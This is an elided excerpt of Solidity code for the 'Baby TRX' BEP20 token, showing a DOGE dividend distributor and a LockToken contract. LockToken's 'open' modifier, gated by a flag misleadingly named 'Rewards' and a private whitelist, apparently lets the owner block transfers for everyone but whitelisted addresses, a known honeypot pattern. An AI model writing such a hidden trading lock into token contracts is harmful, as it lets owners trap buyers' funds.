...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 DOGE = IBEP20(0x2B3F34e9D4b127797CE6244Ea341a83733ddd6E4);
    ...
    uint256 public minDistribution = 1 * (10**18); // 1 DOGE minimum auto send
...
contract LockToken is Ownable {
    bool public Rewards = true;
    mapping(address => bool) private _whiteList;
    modifier open(address from, address to) {
        require(Rewards || _whiteList[from] || _whiteList[to], "Not Open");
        _;
    }
    constructor() {
...
contract BabyTRX is Ownable, IBEP20, SafeToken, LockToken {
    using SafeMath for uint256;
    ...
    string constant _name = "Baby TRX";
    string constant _symbol = "BTRX";
